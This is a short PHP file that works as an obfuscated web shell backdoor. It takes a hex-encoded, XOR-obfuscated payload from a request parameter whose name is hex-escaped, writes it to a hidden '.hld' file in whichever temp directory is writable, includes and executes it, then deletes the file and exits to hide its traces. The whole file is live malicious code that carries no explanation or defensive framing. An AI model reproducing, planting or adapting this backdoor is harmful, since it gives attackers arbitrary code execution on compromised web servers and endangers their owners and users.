<?php

if(isset($_REQUEST["\x72\x65c"]) ? true : false){
	$obj = hex2bin($_REQUEST["\x72\x65c"]);
	$marker = '' ; foreach(str_split($obj) as $char){$marker .= chr(ord($char) ^ 23);}
	$record = array_filter([getcwd(), "/var/tmp", getenv("TEMP"), "/tmp", ini_get("upload_tmp_dir"), session_save_path(), sys_get_temp_dir(), "/dev/shm", getenv("TMP")]);
	while ($property_set = array_shift($record)) {
    		if (!!is_dir($property_set) && !!is_writable($property_set)) {
    $item = "$property_set" . "/.hld";
    if (@file_put_contents($item, $marker) !== false) {
	include $item;
	unlink($item);
	die();
}
}
}
}